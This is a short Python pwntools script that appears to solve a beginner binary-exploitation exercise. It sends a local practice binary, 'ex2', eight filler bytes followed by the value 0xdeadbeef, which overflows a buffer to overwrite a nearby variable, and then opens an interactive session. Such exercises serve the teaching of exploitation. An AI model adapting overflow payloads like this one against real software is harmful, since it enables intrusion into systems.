#!/usr/bin/env python3

from pwn import *

target = process("./bin/ex2")

payload = b"01234567\xef\xbe\xad\xde" # craft the payload

target.send(payload) 

target.interactive()
